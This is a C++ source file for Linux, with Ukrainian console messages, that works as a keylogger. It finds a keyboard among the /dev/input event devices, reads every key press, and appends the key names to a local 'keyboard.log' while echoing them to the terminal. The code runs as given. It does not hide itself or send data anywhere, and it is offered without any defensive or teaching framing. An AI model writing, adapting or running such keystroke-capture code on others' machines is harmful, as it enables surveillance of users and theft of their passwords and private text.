#include <algorithm>
#include <iostream>
#include <fstream>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <cstring>
#include <vector>
#include <unordered_map>

const std::string DEV_INPUT_PATH = "/dev/input/";
const int MAX_EVENTS = 32;
const std::string LOG_FILE = "keyboard.log";

const std::unordered_map<int, std::string> keyMap = {
    {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"},
    {KEY_E, "E"}, {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"},
    {KEY_I, "I"}, {KEY_J, "J"}, {KEY_K, "K"}, {KEY_L, "L"},
    {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"}, {KEY_P, "P"},
    {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
    {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"},
    {KEY_Y, "Y"}, {KEY_Z, "Z"},
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    {KEY_ENTER, "Enter"},
    {KEY_SPACE, "Space"},
    {KEY_BACKSPACE, "Backspace"},
    {KEY_TAB, "Tab"},
    {KEY_ESC, "Esc"},
    {KEY_LEFTSHIFT, "Shift"}, {KEY_RIGHTSHIFT, "Shift"},
    {KEY_LEFTCTRL, "Ctrl"}, {KEY_RIGHTCTRL, "Ctrl"},
    {KEY_LEFTALT, "Alt"}, {KEY_RIGHTALT, "Alt"},
    {KEY_DOT, "."}, {KEY_COMMA, ","},
    {KEY_MINUS, "-"}, {KEY_EQUAL, "="},
    {KEY_SLASH, "/"}, {KEY_BACKSLASH, "\\"},
    {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"},
    {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"}
};

std::string getKeyName(int code) {
    auto it = keyMap.find(code);
    if (it != keyMap.end()) {
        return it->second;
    } else {
        return "UNKNOWN_KEY_" + std::to_string(code);
    }
}

bool isLikelyKeyboard(const std::string &name) {
    std::string lowerName = name;
    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
    return lowerName.find("kbd") != std::string::npos ||
           lowerName.find("keyboard") != std::string::npos ||
           lowerName.find("input") != std::string::npos;
}

std::string findKeyboardDevice() {
    for (int i = 0; i < MAX_EVENTS; ++i) {
        std::string devicePath = DEV_INPUT_PATH + "event" + std::to_string(i);
        int fd = open(devicePath.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;

        char name[256] = "Unknown";
        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
            close(fd);
            continue;
        }

        if (isLikelyKeyboard(name)) {
            close(fd);
            return devicePath;
        }

        close(fd);
    }

    return "";
}

int main() {
    std::string keyboardDevice = findKeyboardDevice();
    if (keyboardDevice.empty()) {
        std::cerr << "❌ Клавіатуру не знайдено!" << std::endl;
        return 1;
    }

    std::cout << "✅ Знайдено клавіатуру: " << keyboardDevice << std::endl;

    int fd = open(keyboardDevice.c_str(), O_RDONLY);
    if (fd < 0) {
        std::cerr << "❌ Не вдалося відкрити пристрій!" << std::endl;
        return 1;
    }

    std::ofstream logFile(LOG_FILE, std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "❌ Не вдалося відкрити лог-файл!" << std::endl;
        close(fd);
        return 1;
    }

    std::cout << "Починаю прослуховування..." << std::endl;

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY && ev.value == 1) {
            std::string keyName = getKeyName(ev.code);
            std::cout << keyName << std::endl;
            logFile << keyName << std::endl;
        }
    }

    close(fd);
    return 0;
}
